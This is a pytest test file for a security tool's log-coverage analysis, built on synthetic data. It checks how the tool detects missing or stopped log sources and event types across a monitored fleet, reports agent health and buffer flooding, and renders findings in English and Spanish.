"""Tests for hushwatch.analysis.coverage (peer groups, contracts, event types, agent health, section).

Synthetic data only: *.example / *.corp.example hosts, RFC 5737 / RFC 1918 addresses, fake accounts.
"""

from __future__ import annotations

import json
import random
import string
from collections.abc import Iterable, Iterator
from datetime import datetime, timedelta, timezone
from typing import Any

import pytest

from hushwatch import i18n
from hushwatch.analysis.coverage import (
    WATCH_CODES,
    CoverageCollector,
    CoverageResult,
    analyze_coverage,
    platform_family,
)
from hushwatch.config import Expectation, TenantConfig
from hushwatch.i18n import Entity, Message, render
from hushwatch.inventory import AgentInfo
from hushwatch.models import Confidence, DataBasis, Event, Finding, Severity, fingerprint, iter_entities

UTC = timezone.utc
RAW = DataBasis(input_kind="archives")  # full fidelity: gaps are measured, not inferred
ALERTS = DataBasis(input_kind="alerts")
BASE = datetime(2026, 9, 1, tzinfo=UTC)
NOW = BASE + timedelta(days=3)
SYSMON = "Microsoft-Windows-Sysmon/Operational"
WIN_SOURCES: dict[str, list[str]] = {
    "Security": ["4624", "4688"],
    "System": ["7036"],
    SYSMON: ["1", "3"],
}


# ---- helpers ------------------------------------------------------------------------------------------------------


def ev(
    host: str,
    ts: datetime,
    log_source: str | None,
    *,
    code: str | None = None,
    platform: str | None = "windows",
    rule_id: str | None = "60106",
    groups: tuple[str, ...] = (),
    fields: dict[str, Any] | None = None,
    agent_id: str = "001",
) -> Event:
    return Event(
        ts=ts,
        rule_id=rule_id,
        source=host,
        log_source=log_source,
        event_code=code,
        os_platform=platform,
        rule_groups=groups,
        fields=fields if fields is not None else {"agent.name": host, "agent.id": agent_id},
    )


def host_events(
    host: str,
    sources: dict[str, list[str]] | None = None,
    *,
    start: datetime = BASE,
    end: datetime = NOW,
    step: timedelta = timedelta(hours=2),
    platform: str | None = "windows",
    rule_id: str | None = "60106",
    stop: dict[tuple[str, str], datetime] | None = None,
) -> Iterator[Event]:
    """Every source/code of ``sources`` once per ``step`` in [start, end); ``stop`` cuts a (source, code) short."""
    sources = WIN_SOURCES if sources is None else sources
    ts = start
    while ts < end:
        for log_source, codes in sources.items():
            for code in codes or [None]:  # type: ignore[list-item]
                cut = (stop or {}).get((log_source, code or ""))
                if cut is not None and ts >= cut:
                    continue
                yield ev(host, ts, log_source, code=code, platform=platform, rule_id=rule_id)
        ts += step


def collect(events: Iterable[Event], tenant: TenantConfig | None = None, **kwargs: Any) -> CoverageCollector:
    collector = CoverageCollector(tenant or TenantConfig(), **kwargs)
    for event in events:
        collector.add(event)
    return collector


def fleet(names: Iterable[str], overrides: dict[str, dict[str, list[str]]] | None = None, **kwargs: Any) -> list[Event]:
    out: list[Event] = []
    for name in names:
        out.extend(host_events(name, (overrides or {}).get(name), **kwargs))
    return out


def run(
    events: Iterable[Event],
    tenant: TenantConfig | None = None,
    *,
    now: datetime = NOW,
    agents: list[AgentInfo] | None = None,
    basis: DataBasis | None = None,
    wallclock: datetime | None = None,
) -> CoverageResult:
    tenant = tenant or TenantConfig()
    collector = collect(events, tenant)
    return analyze_coverage(collector, tenant=tenant, now=now, agents=agents, basis=basis, wallclock=wallclock)


def kinds(result: CoverageResult) -> list[str]:
    return [f.kind for f in result.findings]


def by_kind(result: CoverageResult, kind: str) -> list[Finding]:
    return [f for f in result.findings if f.kind == kind]


def host_values(finding: Finding) -> set[str]:
    return {e.value for e in finding.evidence.get("hosts", []) if isinstance(e, Entity)}


def agent(
    name: str,
    status: str = "active",
    *,
    keepalive: datetime | None = NOW,
    platform: str | None = "windows",
    groups: tuple[str, ...] = ("default",),
    agent_id: str = "001",
    date_add: datetime | None = BASE - timedelta(days=30),
) -> AgentInfo:
    return AgentInfo(
        id=agent_id,
        name=name,
        status=status,
        last_keepalive=keepalive,
        date_add=date_add,
        platform=platform,
        groups=groups,
    )


def windows_names(prefix: str, count: int) -> list[str]:
    return [f"{prefix}-{i:02d}.corp.example" for i in range(count)]


# ---- peer groups --------------------------------------------------------------------------------------------------


def test_peer_group_flags_host_missing_a_source_its_peers_send() -> None:
    names = windows_names("ws", 8)
    events = fleet(names, {names[7]: {"Security": ["4624", "4688"], "System": ["7036"]}})
    result = run(events)
    gaps = by_kind(result, "coverage.missing_source")
    assert len(gaps) == 1
    finding = gaps[0]
    assert finding.domain == "coverage"
    assert finding.severity is Severity.MEDIUM
    assert finding.subject == f"peers:windows|ls:{SYSMON}|tier:standard"
    assert host_values(finding) == {names[7]}
    assert finding.evidence["share"] == 1.0
    assert finding.evidence["peers"] == 7
    assert finding.evidence["min_expected_events"] >= 10
    assert isinstance(finding.title, Message) and finding.title.key == "coverage.peer.title.one"
    title = render(finding.title)
    assert names[7] in title and SYSMON in title
    assert "no envía" in render(finding.title, "es")
    row = next(r for r in result.section["matrix"] if r["agent"].value == names[7])
    assert row["log_sources"][SYSMON] == "missing"
    assert row["log_sources"]["Security"] == "present"


def test_peer_group_needs_five_hosts() -> None:
    names = windows_names("ws", 4)
    result = run(fleet(names, {names[3]: {"Security": ["4624", "4688"]}}))
    assert by_kind(result, "coverage.missing_source") == []
    assert "peer_groups_too_small" in result.section["not_assessed"]
    assert result.section["status"] == "not_assessed"


def test_peer_share_below_threshold_is_not_a_gap() -> None:
    names = windows_names("ws", 10)
    lacking = {"Security": ["4624", "4688"], "System": ["7036"]}
    # 8 of 10 send Sysmon: each lacking host sees 8/9 = 0.89 < 0.9
    result = run(fleet(names, {names[8]: lacking, names[9]: lacking}))
    assert by_kind(result, "coverage.missing_source") == []


def test_peer_gaps_are_grouped_per_source_and_tier() -> None:
    names = [*windows_names("ws", 12), "dc01.corp.example", "dc02.corp.example"]
    lacking = {"Security": ["4624", "4688"], "System": ["7036"]}
    tenant = TenantConfig(criticality={"critical": ["dc*"]}, silence=TenantConfig().silence)
    tenant.silence.peer_coverage = 0.8
    events = fleet(names, {"dc01.corp.example": lacking, "ws-00.corp.example": lacking, "ws-01.corp.example": lacking})
    result = run(events, tenant, basis=RAW)
    gaps = by_kind(result, "coverage.missing_source")
    assert {f.subject for f in gaps} == {
        f"peers:windows|ls:{SYSMON}|tier:critical",
        f"peers:windows|ls:{SYSMON}|tier:standard",
    }
    critical = next(f for f in gaps if f.evidence["tier"] == "critical")
    standard = next(f for f in gaps if f.evidence["tier"] == "standard")
    assert critical.severity is Severity.HIGH
    assert critical.confidence is Confidence.HIGH
    assert standard.severity is Severity.MEDIUM
    assert host_values(standard) == {"ws-00.corp.example", "ws-01.corp.example"}
    assert standard.title.key == "coverage.peer.title.many"  # type: ignore[union-attr]
    # critical findings sort first
    assert result.findings[0] is critical
    assert result.section["matrix"][0]["tier"] == "critical"


def test_linux_distro_equivalent_sources_are_not_gaps() -> None:
    ubuntu = {"/var/log/auth.log": [], "/var/log/syslog": [], "syscheck": []}
    names = [f"srv-{i:02d}.example" for i in range(7)]
    overrides = {
        names[5]: {"/var/log/secure": [], "/var/log/messages": [], "syscheck": []},  # RHEL layout
        names[6]: {"journald": [], "syscheck": []},  # journald-only distro
    }
    events: list[Event] = []
    for name in names:
        events.extend(host_events(name, overrides.get(name, ubuntu), platform="linux", rule_id="5501"))
    result = run(events)
    assert by_kind(result, "coverage.missing_source") == []
    # a host with no auth source at all is a gap, reported with the class label
    events.extend(host_events("srv-99.example", {"syscheck": [], "/var/log/syslog": []}, platform="linux"))
    result = run(events)
    gaps = by_kind(result, "coverage.missing_source")
    assert len(gaps) == 1
    assert "/var/log/secure" in gaps[0].evidence["log_source"]
    assert host_values(gaps[0]) == {"srv-99.example"}


def test_briefly_observed_host_is_not_judged() -> None:
    names = windows_names("ws", 7)
    events = fleet(names)
    # new host: reporting only for the last 2 hours
    events.extend(host_events("ws-new.corp.example", {"Security": ["4624"]}, start=NOW - timedelta(hours=2)))
    result = run(events)
    assert by_kind(result, "coverage.missing_source") == []
    assert result.section["counters"].get("peer_gaps_not_assessed", 0) >= 1


def test_clock_outlier_does_not_stretch_observation() -> None:
    names = windows_names("ws", 7)
    events = fleet(names)
    # a host whose clock once reported a year-old time, then 2 hours of normal traffic without Sysmon
    odd = "ws-odd.corp.example"
    events.append(ev(odd, BASE - timedelta(days=365), "Security", code="4624"))
    events.extend(host_events(odd, {"Security": ["4624"]}, start=NOW - timedelta(hours=2)))
    result = run(events)
    assert by_kind(result, "coverage.missing_source") == []
    assert by_kind(result, "coverage.missing_event_type") == []


def test_peer_group_from_api_agent_group() -> None:
    dcs = [f"dc{i:02d}.corp.example" for i in range(6)]
    workstations = windows_names("ws", 10)
    dc_sources = {**WIN_SOURCES, "Directory Service": ["2889"]}
    events = fleet(workstations)
    events += fleet(dcs, {d: dc_sources for d in dcs[:5]})  # dcs[5] lacks Directory Service
    agents = [agent(n, groups=("default", "domain_controllers")) for n in dcs]
    agents += [agent(n, groups=("default",), agent_id="002") for n in workstations]
    result = run(events, agents=agents, wallclock=NOW)
    gaps = by_kind(result, "coverage.missing_source")
    assert len(gaps) == 1
    assert gaps[0].subject == "peers:windows/domain_controllers|ls:Directory Service|tier:standard"
    assert host_values(gaps[0]) == {dcs[5]}


# ---- contracts ----------------------------------------------------------------------------------------------------


def contract_tenant(*contracts: Expectation, **kwargs: Any) -> TenantConfig:
    return TenantConfig(expectations=list(contracts), **kwargs)


def test_contract_matches_platform_and_name_glob() -> None:
    tenant = contract_tenant(
        Expectation(name="windows servers", log_sources=["Security", SYSMON], match={"platform": "windows",
                                                                                      "name": "srv-*"})
    )  # fmt: skip
    events = fleet(["srv-web-01.example"], {"srv-web-01.example": {"Security": ["4624"], "System": ["7036"]}})
    events += fleet(["srv-db-01.example"])
    events += fleet(["ws-01.example"], {"ws-01.example": {"Security": ["4624"]}})  # not matched by the glob
    events += fleet(["srv-lin-01.example"], {"srv-lin-01.example": {"/var/log/auth.log": []}}, platform="linux")
    result = run(events, tenant)
    gaps = by_kind(result, "coverage.missing_source")
    assert len(gaps) == 1
    finding = gaps[0]
    assert finding.subject == f"contract:windows servers|ls:{SYSMON}|state:missing|tier:standard"
    assert host_values(finding) == {"srv-web-01.example"}
    assert finding.evidence["matched"] == 2
    assert "windows servers" in render(finding.title)
    assert "contrato" in render(finding.title, "es")
    row = next(r for r in result.section["expected_sources"] if r["basis"] == "contract" and r["log_source"] == SYSMON)
    assert row == {**row, "name": "windows servers", "matched": 2, "present": 1, "missing": 1}


def test_contract_matches_api_groups_case_insensitively() -> None:
    tenant = contract_tenant(
        Expectation(name="dcs", log_sources=["Directory Service"], match={"groups": ["Domain_Controllers"]})
    )
    events = fleet(["dc01.corp.example"], {"dc01.corp.example": {**WIN_SOURCES, "Directory Service": ["2889"]}})
    events += fleet(["dc02.corp.example", "ws-01.corp.example"])
    agents = [
        agent("dc01.corp.example", groups=("domain_controllers",)),
        agent("dc02.corp.example", groups=("domain_controllers",), agent_id="002"),
        agent("ws-01.corp.example", groups=("default",), agent_id="003"),
    ]
    result = run(events, tenant, agents=agents, wallclock=NOW)
    gaps = by_kind(result, "coverage.missing_source")
    assert [host_values(f) for f in gaps] == [{"dc02.corp.example"}]
    # without the API there are no groups, so the contract matches nothing (and says so)
    result = run(events, tenant)
    assert by_kind(result, "coverage.missing_source") == []
    row = result.section["expected_sources"][0]
    assert row["matched"] == 0


def test_contract_silent_and_low_rate_states() -> None:
    tenant = contract_tenant(
        Expectation(name="sysmon everywhere", log_sources=[SYSMON], match={"platform": "windows"}),
        Expectation(name="busy security", log_sources=["Security"], match={"name": "ws-02*"}, min_events_per_day=500),
    )
    stopped_at = NOW - timedelta(days=2)
    events = list(host_events("ws-01.corp.example", stop={(SYSMON, "1"): stopped_at, (SYSMON, "3"): stopped_at}))
    events += fleet(["ws-02.corp.example"])
    result = run(events, tenant, basis=RAW)
    gaps = {f.evidence["state"]: f for f in by_kind(result, "coverage.missing_source")}
    assert set(gaps) == {"silent", "low"}
    silent = gaps["silent"]
    assert silent.severity is Severity.HIGH  # it worked and stopped while the host kept sending: active blindness
    assert host_values(silent) == {"ws-01.corp.example"}
    assert silent.evidence["last_seen"][0]["last_seen"].startswith("2026-09-01T22")
    low = gaps["low"]
    assert host_values(low) == {"ws-02.corp.example"}
    assert low.evidence["rates"][0]["rate"] < 500
    assert "500" in render(low.title)
    matrix = {r["agent"].value: r["log_sources"] for r in result.section["matrix"]}
    assert matrix["ws-01.corp.example"][SYSMON] == "silent"


def test_contract_glob_log_sources_and_short_observation() -> None:
    tenant = contract_tenant(Expectation(name="any sysmon", log_sources=["*sysmon*"], match={}))
    events = fleet(["ws-01.corp.example"])
    events += list(host_events("ws-02.corp.example", {"Security": ["4624"]}, start=NOW - timedelta(hours=6)))
    result = run(events, tenant)
    # ws-01 matches the glob; ws-02 was observed for only 6 h: not enough for a contract verdict
    assert by_kind(result, "coverage.missing_source") == []
    row = result.section["expected_sources"][0]
    assert row["present"] == 1 and row["not_assessed"] == 1


def test_invalid_contract_is_reported_not_silently_ignored() -> None:
    tenant = contract_tenant(Expectation(name="typo", log_sources=["Security"], match={"os": "windows"}))
    result = run(fleet(windows_names("ws", 2)), tenant)
    assert "contract_invalid:typo" in result.section["not_assessed"]


def test_contract_and_peer_gap_are_reported_once() -> None:
    tenant = contract_tenant(Expectation(name="sysmon", log_sources=[SYSMON], match={"platform": "windows"}))
    names = windows_names("ws", 8)
    result = run(fleet(names, {names[0]: {"Security": ["4624", "4688"], "System": ["7036"]}}), tenant)
    gaps = by_kind(result, "coverage.missing_source")
    assert len(gaps) == 1
    assert gaps[0].subject.startswith("contract:sysmon|")


def test_contract_never_matches_manager_without_name() -> None:
    tenant = contract_tenant(Expectation(name="linux", log_sources=["/var/log/audit/audit.log"],
                                         match={"platform": "linux"}))  # fmt: skip
    manager_fields = {"agent.name": "wazuh-manager", "agent.id": "000"}
    events = [
        ev("wazuh-manager", BASE + timedelta(hours=h), "/var/log/auth.log", platform="linux", fields=manager_fields)
        for h in range(72)
    ]
    result = run(events, tenant)
    assert by_kind(result, "coverage.missing_source") == []


# ---- event types --------------------------------------------------------------------------------------------------


def test_4688_missing_while_4624_flows() -> None:
    names = windows_names("ws", 7)
    lacking = {"Security": ["4624"], "System": ["7036"], SYSMON: ["1", "3"]}
    result = run(fleet(names, {names[3]: lacking}))
    findings = by_kind(result, "coverage.missing_event_type")
    assert len(findings) == 1
    finding = findings[0]
    assert finding.subject == "event_type:win_4688|never|tier:standard"
    assert finding.evidence["code"] == "4688" and finding.evidence["anchor_code"] == "4624"
    assert host_values(finding) == {names[3]}
    assert "process creation" in render(finding.title)
    assert "creación de procesos" in render(finding.title, "es")
    reasons = " ".join(render(r) for r in finding.reasons)
    assert "blind" in reasons
    assert "Audit Process Creation" in render(finding.recommendation)
    row = next(r for r in result.section["event_types"] if r["check"] == "win_4688")
    assert row["assessed"] and row["missing"] == 1


def test_4688_check_needs_peers() -> None:
    names = windows_names("ws", 3)
    result = run(fleet(names, {names[0]: {"Security": ["4624"]}}))
    assert by_kind(result, "coverage.missing_event_type") == []
    assert "event_type_peers_too_few:win_4688" in result.section["not_assessed"]


def test_4688_not_expected_on_hosts_without_4624() -> None:
    names = windows_names("ws", 7)
    result = run(fleet(names, {names[0]: {"Security": ["4625"], "System": ["7036"], SYSMON: ["1", "3"]}}))
    assert by_kind(result, "coverage.missing_event_type") == []


def test_sysmon_eid1_missing_while_channel_present() -> None:
    names = windows_names("ws", 7)
    result = run(fleet(names, {names[2]: {"Security": ["4624", "4688"], "System": ["7036"], SYSMON: ["3", "11"]}}))
    findings = by_kind(result, "coverage.missing_event_type")
    assert [f.evidence["check"] for f in findings] == ["sysmon_1"]
    assert host_values(findings[0]) == {names[2]}
    assert "EventID 1" in render(findings[0].title)


def test_sysmon_eid1_rare_in_alerts_is_not_flagged() -> None:
    # alerts-only reality: only a few hosts ever produce Sysmon EID 1 alerts -> peers do not support a verdict
    names = windows_names("ws", 10)
    few = {"Security": ["4624", "4688"], "System": ["7036"], SYSMON: ["3"]}
    result = run(fleet(names, {n: few for n in names[3:]}))
    assert by_kind(result, "coverage.missing_event_type") == []


def test_event_type_that_stopped_is_possible_tampering() -> None:
    stop = NOW - timedelta(days=2)
    events = list(host_events("ws-01.corp.example", stop={("Security", "4688"): stop}, start=BASE - timedelta(days=4)))
    result = run(events)
    findings = by_kind(result, "coverage.missing_event_type")
    assert len(findings) == 1
    finding = findings[0]
    assert finding.evidence["variant"] == "stopped"
    assert finding.subject == "agent:ws-01.corp.example|ls:Security|code:4688|stopped"
    assert finding.severity is Severity.HIGH
    assert finding.evidence["mitre"] == ["T1562.002"]
    assert "T1562.002" in render(finding.reasons[0])
    # the same pattern on a critical host is critical
    tenant = TenantConfig(criticality={"critical": ["ws-01*"]})
    result = run(events, tenant)
    assert by_kind(result, "coverage.missing_event_type")[0].severity is Severity.CRITICAL


def test_fleet_wide_stop_is_one_root_cause_finding() -> None:
    # a GPO rollout (or, on alerts, a tuned rule 67027) stops 4688 everywhere at once: one finding, not six
    stop = NOW - timedelta(days=2)
    names = windows_names("ws", 6)
    events: list[Event] = []
    for name in names:
        events.extend(host_events(name, stop={("Security", "4688"): stop}, start=BASE - timedelta(days=4)))
    events.extend(host_events("ws-ok.corp.example", start=BASE - timedelta(days=4)))
    result = run(events)
    findings = by_kind(result, "coverage.missing_event_type")
    assert len(findings) == 1
    finding = findings[0]
    assert finding.subject == "event_type:win_4688|stopped|fleet"
    assert finding.evidence["hosts_total"] == 6 and finding.evidence["hosts_with_channel"] == 7
    assert finding.severity is Severity.HIGH
    assert "6 of 7" in render(finding.title)
    keys = [r.key for r in finding.reasons if isinstance(r, Message)]
    assert "coverage.event_type.stopped.alerts_caveat" in keys  # alerts basis: a rule change looks the same


def test_event_type_stop_needs_history_and_live_channel() -> None:
    # too little history before the stop
    stop = BASE + timedelta(hours=10)
    result = run(host_events("ws-01.corp.example", stop={("Security", "4688"): stop}))
    assert by_kind(result, "coverage.missing_event_type") == []
    # the whole channel stopped (silence / agent-health territory, not an event-type change)
    events = list(host_events("ws-01.corp.example", start=BASE - timedelta(days=4), end=NOW - timedelta(days=2)))
    assert by_kind(run(events), "coverage.missing_event_type") == []


# ---- agent health (Wazuh API) ---------------------------------------------------------------------------------------


def test_disconnected_agents_by_tier_sla() -> None:
    tenant = TenantConfig(criticality={"critical": ["dc*"], "low": ["lap-*"]})
    agents = [
        agent("dc01.corp.example", "disconnected", keepalive=NOW - timedelta(hours=5), agent_id="001"),
        agent("srv-web-01.example", "disconnected", keepalive=NOW - timedelta(hours=5), agent_id="002"),
        agent("lap-01.example", "disconnected", keepalive=NOW - timedelta(hours=80), agent_id="003"),
        agent("lap-02.example", "disconnected", keepalive=NOW - timedelta(hours=30), agent_id="004"),
    ]
    result = run([], tenant, agents=agents, wallclock=NOW)
    found = {f.subject: f for f in by_kind(result, "pipeline.agent_disconnected")}
    assert set(found) == {"agent:dc01.corp.example", "agent:lap-01.example"}
    assert found["agent:dc01.corp.example"].severity is Severity.CRITICAL  # 5 h > 4 h critical SLA
    assert found["agent:lap-01.example"].severity is Severity.MEDIUM  # 80 h > 72 h low SLA
    assert found["agent:dc01.corp.example"].domain == "pipeline"
    assert found["agent:dc01.corp.example"].evidence["disconnected_hours"] == 5.0
    assert "5h" in render(found["agent:dc01.corp.example"].title)
    assert result.section["counters"]["agents_disconnected_within_sla"] == 2


def test_never_connected_and_pending_agents() -> None:
    agents = [
        agent("ws-09.corp.example", "never_connected", keepalive=None, platform=None),
        agent("ws-10.corp.example", "pending", keepalive=NOW - timedelta(days=3), agent_id="002"),
    ]
    result = run([], agents=agents, wallclock=NOW)
    found = {f.subject: f for f in by_kind(result, "pipeline.agent_disconnected")}
    assert found["agent:ws-09.corp.example"].severity is Severity.MEDIUM
    assert "never connected" in render(found["agent:ws-09.corp.example"].title)
    assert found["agent:ws-10.corp.example"].severity is Severity.HIGH
    assert "pending" in render(found["agent:ws-10.corp.example"].title)


def test_disconnected_without_keepalive_uses_last_event() -> None:
    events = list(host_events("ws-01.corp.example", end=NOW - timedelta(days=2)))
    agents = [agent("ws-01.corp.example", "disconnected", keepalive=None)]
    result = run(events, agents=agents, wallclock=NOW)
    finding = by_kind(result, "pipeline.agent_disconnected")[0]
    assert finding.evidence["disconnected_hours"] > 24


def test_alive_agent_without_data_is_collection_broken() -> None:
    names = windows_names("ws", 3)
    events = fleet(names[:2], rule_id=None)  # archives: raw events, full fidelity
    events += list(host_events(names[2], end=NOW - timedelta(days=2), rule_id=None))
    agents = [agent(n, agent_id=f"00{i}") for i, n in enumerate(names)]
    result = run(events, agents=agents)  # API time estimated from the freshest keepalive
    found = by_kind(result, "pipeline.agent_no_data")
    assert [f.subject for f in found] == [f"agent:{names[2]}"]
    finding = found[0]
    assert finding.severity is Severity.HIGH
    assert finding.evidence["basis"] == "raw"
    assert finding.evidence["silent_hours"] >= 24
    assert "collection" in render(finding.title)
    assert "recolección" in render(finding.title, "es")


def test_alive_agent_without_data_on_alerts_basis_is_softer() -> None:
    names = windows_names("ws", 3)
    events = fleet(names[:2])
    events += list(host_events(names[2], end=NOW - timedelta(days=2)))
    agents = [agent(n, agent_id=f"00{i}") for i, n in enumerate(names)]
    basis = DataBasis(input_kind="alerts")
    result = run(events, agents=agents, basis=basis)
    finding = by_kind(result, "pipeline.agent_no_data")[0]
    assert finding.severity is Severity.MEDIUM
    assert finding.confidence.value == "low"
    assert any(isinstance(r, Message) and r.key == "coverage.agent.no_data.alerts_caveat" for r in finding.reasons)


def test_alive_agent_never_seen() -> None:
    names = windows_names("ws", 2)
    events = fleet(names[:1], rule_id=None, start=NOW - timedelta(days=8))
    agents = [agent(n, agent_id=f"00{i}") for i, n in enumerate(names)]
    result = run(events, agents=agents, wallclock=NOW)
    finding = by_kind(result, "pipeline.agent_no_data")[0]
    assert finding.subject == f"agent:{names[1]}"
    assert finding.evidence["last_event"] is None
    assert finding.title.key == "coverage.agent.no_data.title_never"  # type: ignore[union-attr]
    # alerts basis and a 2-day window: an agent may be legitimately quiet -> not assessed
    result = run(fleet(names[:1], start=NOW - timedelta(days=2)), agents=agents, wallclock=NOW)
    assert by_kind(result, "pipeline.agent_no_data") == []
    assert result.section["counters"]["no_data_not_assessed"] == 1


def test_active_agent_with_recent_data_is_fine() -> None:
    names = windows_names("ws", 2)
    agents = [agent(n, agent_id=f"00{i}") for i, n in enumerate(names)]
    result = run(fleet(names), agents=agents, wallclock=NOW)
    assert [f for f in result.findings if f.domain == "pipeline"] == []


def test_stale_export_skips_api_cross_check() -> None:
    names = windows_names("ws", 2)
    events = fleet(names[:1], rule_id=None)
    agents = [agent(n, keepalive=NOW + timedelta(days=30), agent_id=f"00{i}") for i, n in enumerate(names)]
    result = run(events, agents=agents)  # API snapshot a month after the data ends
    assert by_kind(result, "pipeline.agent_no_data") == []
    assert "api_cross_check_data_not_current" in result.section["not_assessed"]


def test_manager_000_is_excluded() -> None:
    manager = AgentInfo(id="000", name="wazuh-manager", status="active", last_keepalive=None, platform="ubuntu")
    manager_fields = {"agent.name": "wazuh-manager", "agent.id": "000"}
    relayed_fields = {"agent.name": "wazuh-manager", "agent.id": "000", "predecoder.hostname": "fw-edge-01"}
    events = [
        ev("wazuh-manager", BASE + timedelta(hours=h), "ossec", platform="linux", fields=manager_fields)
        for h in range(72)
    ]
    events += [
        ev("fw-edge-01", BASE + timedelta(hours=h), "192.0.2.1", platform=None, fields=relayed_fields)
        for h in range(72)
    ]
    linux = [f"srv-{i:02d}.example" for i in range(6)]
    for name in linux:
        events.extend(host_events(name, {"/var/log/auth.log": [], "syscheck": []}, platform="linux"))
    agents = [manager] + [agent(n, platform="ubuntu", agent_id=f"10{i}") for i, n in enumerate(linux)]
    result = run(events, agents=agents, wallclock=NOW)
    # the manager is neither a peer, nor judged, nor listed
    assert result.findings == []
    rows = {r["agent"].value: r for r in result.section["matrix"]}
    assert "wazuh-manager" not in rows
    assert rows["fw-edge-01"]["status"] == "relayed"
    assert result.section["agents"]["by_status"] == {"active": 6}
    assert result.section["agents"]["relayed"] == 1
    assert result.section["platforms"]["linux"]["reporting"] == 6


def test_api_join_is_case_insensitive_and_accepts_short_names() -> None:
    events = fleet(["WS-01.corp.example", "ws-02.corp.example"], rule_id=None)
    agents = [agent("ws-01.corp.example"), agent("ws-02", agent_id="002")]
    result = run(events, agents=agents, wallclock=NOW)
    rows = {r["agent"].value: r for r in result.section["matrix"]}
    assert set(rows) == {"ws-01.corp.example", "ws-02"}
    assert result.section["agents"]["api_only"] == 0
    assert by_kind(result, "pipeline.agent_no_data") == []


def test_exact_name_join_wins_over_case_insensitive() -> None:
    events = fleet(["SRV01", "srv01"], rule_id=None)
    agents = [agent("srv01")]
    result = run(events, agents=agents, wallclock=NOW)
    names = sorted(r["agent"].value for r in result.section["matrix"])
    assert names == ["SRV01", "srv01"]


def test_inventory_asset_never_seen() -> None:
    agents = [agent("nas-01.example", "unknown", keepalive=None, platform=None)]
    result = run(fleet(["ws-01.corp.example"], rule_id=None), agents=agents, wallclock=NOW)
    finding = next(f for f in result.findings if f.subject == "agent:nas-01.example|ls:*")
    assert finding.kind == "coverage.missing_source"
    assert finding.evidence["check"] == "inventory"
    # alerts only: three quiet days prove nothing about an asset (same bar as an active agent without data)
    result = run(fleet(["ws-01.corp.example"]), agents=agents, wallclock=NOW)
    assert not [f for f in result.findings if f.subject == "agent:nas-01.example|ls:*"]
    assert result.section["counters"]["never_seen_not_assessed"] == 1


# ---- agent buffer flooding ------------------------------------------------------------------------------------------


def test_agent_buffer_flooding_rules() -> None:
    events = list(host_events("ws-01.corp.example"))
    events.append(ev("ws-01.corp.example", NOW - timedelta(hours=3), "wazuh-agent", rule_id="203",
                     groups=("agent_flooding",)))  # fmt: skip
    events.append(ev("ws-02.corp.example", NOW - timedelta(hours=3), "wazuh-agent", rule_id="202",
                     groups=("agent_flooding",)))  # fmt: skip
    # a different product's rule "204" (other groups) is not a Wazuh buffer event
    events.append(ev("ws-03.corp.example", NOW, "app", rule_id="204", groups=("web",)))
    result = run(events)
    found = {f.subject: f for f in by_kind(result, "pipeline.manager_drops")}
    assert set(found) == {"agent:ws-01.corp.example|agent_buffer", "agent:ws-02.corp.example|agent_buffer"}
    assert found["agent:ws-01.corp.example|agent_buffer"].severity is Severity.HIGH
    assert found["agent:ws-01.corp.example|agent_buffer"].evidence["events_lost"] is True
    assert found["agent:ws-02.corp.example|agent_buffer"].severity is Severity.MEDIUM


# ---- section, rendering, privacy -----------------------------------------------------------------------------------


def test_section_shape_and_json_serializable() -> None:
    names = windows_names("ws", 8)
    tenant = TenantConfig(
        criticality={"critical": ["ws-07*"]},
        expectations=[Expectation(name="sec", log_sources=["Security", "Windows PowerShell"],
                                  match={"platform": "windows"})],
    )  # fmt: skip
    events = fleet(names, {names[7]: {"Security": ["4624", "4688"], "System": ["7036"]}})
    result = run(events, tenant, agents=[agent("ws-99.corp.example", "never_connected", keepalive=None)], basis=RAW)
    section = result.section
    assert section["status"] in ("ok", "warn", "fail", "not_assessed")
    assert section["status"] == "fail"
    assert set(section) >= {"status", "platforms", "matrix", "expected_sources"}
    assert section["platforms"]["windows"]["peer_group"] is True
    assert SYSMON in section["platforms"]["windows"]["expected"]
    first = section["matrix"][0]
    assert first["agent"] == Entity("host", names[7])  # critical tier first
    assert set(first["log_sources"].values()) <= {"present", "missing", "silent"}
    assert first["log_sources"]["Windows PowerShell"] == "missing"
    never = next(r for r in section["matrix"] if r["agent"].value == "ws-99.corp.example")
    assert never["events"] == 0 and never["status"] == "never_connected"
    json.dumps(section, default=lambda o: o.value if isinstance(o, Entity) else str(o))


def test_matrix_is_capped() -> None:
    names = [f"ws-{i:04d}.corp.example" for i in range(320)]
    events = [ev(n, BASE, "Security", code="4624") for n in names]
    result = run(events)
    assert len(result.section["matrix"]) == 300
    assert result.section["matrix_truncated"] is True
    assert result.section["matrix_total"] == 320


def test_messages_render_in_both_languages_and_entities_are_wrapped() -> None:
    names = windows_names("ws", 8)
    tenant = TenantConfig(expectations=[Expectation(name="c", log_sources=["Nope"], match={"platform": "windows"})])
    events = fleet(names, {names[0]: {"Security": ["4624"], "System": ["7036"]}})
    events.append(ev(names[1], NOW, "wazuh-agent", rule_id="204", groups=("agent_flooding",)))
    agents = [agent(names[2], "disconnected", keepalive=BASE), agent("ws-50.corp.example", "never_connected")]
    result = run(events, tenant, agents=agents, wallclock=NOW)
    assert len(result.findings) >= 4
    all_hosts = set(names) | {"ws-50.corp.example"}
    for finding in result.findings:
        for lang in ("en", "es"):
            for msg in [finding.title, *finding.reasons, finding.recommendation]:
                text = render(msg, lang)
                assert text and "{" not in text, (finding.kind, lang, text)
        # host names appear only as Entity values (redactable), never as plain strings in params/evidence
        params: list[Any] = [finding.evidence]
        for msg in [finding.title, *finding.reasons]:
            if isinstance(msg, Message):
                params.append(dict(msg.params))
        assert not _plain_strings(params) & all_hosts, finding.kind
        assert {e.value for e in iter_entities(params)} & all_hosts, finding.kind


def _plain_strings(value: Any) -> set[str]:
    if isinstance(value, str):
        return {value}
    if isinstance(value, Entity):
        return set()
    if isinstance(value, Message):
        return _plain_strings(dict(value.params))
    if isinstance(value, dict):
        return set().union(*(_plain_strings(v) for v in value.values())) if value else set()
    if isinstance(value, (list, tuple, set)):
        return set().union(*(_plain_strings(v) for v in value)) if value else set()
    return set()


def test_every_coverage_message_has_spanish() -> None:
    keys = [k for k in i18n.keys() if k.startswith("coverage.")]  # noqa: SIM118 (i18n.keys is a function)
    assert len(keys) > 40
    for key in keys:
        translations = i18n._CATALOG[key]
        assert translations.get("es"), key
        assert translations["es"] != translations["en"] or key.startswith("coverage.tier"), key


# ---- robustness -----------------------------------------------------------------------------------------------------


def test_hostile_values_do_not_crash_and_are_bounded() -> None:
    rng = random.Random(7)
    weird = [
        "a" * 10_000,
        "\x1b[2J[bold]x[/bold]",
